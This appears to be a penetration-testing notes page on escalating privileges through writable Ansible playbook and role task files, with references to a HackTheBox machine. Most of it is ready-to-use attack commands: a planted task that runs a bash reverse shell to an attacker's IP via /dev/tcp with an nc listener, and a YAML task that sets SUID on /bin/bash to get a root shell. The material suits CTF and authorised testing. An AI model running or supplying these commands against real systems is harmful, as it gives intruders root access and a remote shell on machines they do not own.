---
description: Ansible Playbooks are lists of tasks that automatically execute against hosts.
---

# Ansible

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)

### [PrivEsc with Tasks](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/#privesc-with-tasks) <a href="#privesc-with-tasks" id="privesc-with-tasks"></a>

{% code overflow="wrap" %}
```bash
# Create a yml file under /opt/ansible/playbooks. You see a geerlingguy.apache role defined. 

- name: Install and configure Apache
  ...
  roles:
    - role: geerlingguy.apache
  tasks:
    - name: configure firewall
      firewalld:
        ...

# Go to the dirctory /opt/ansible/roles/geerlingguy.apache/tasks, and add a new exploitable file in the directory.

- hosts: localhost
  tasks:
    - name: RShell
      command: sudo bash /tmp/root.sh
      
# Then creat a reverse shell in root.sh
echo '/bin/bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1' > /tmp/root.sh

# 
nc -lvnp <local-port>

# Execute
sudo ansible
sudo -u <user> ansible
# or wait for a root runs the ansible background.
```
{% endcode %}



### Automation Task

[https://www.hackthebox.com/machines/inject](https://www.hackthebox.com/machines/inject)

If the target system runs automation tasks with Ansible Playbook as root and we have a write permission of task files (**`tasks/`**), we can inject arbitrary commands in **yaml** file.

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Create or overwrite a YAML malicious file.
echo "[{hosts: localhost, become: true, tasks: [shell: chmod +s /bin/bash]}]" > /opt/automation/tasks/pe.yml

# wait for pe.yml to be executed
# Run and then you are root. 
/bin/bash -p 
```
{% endcode %}

###
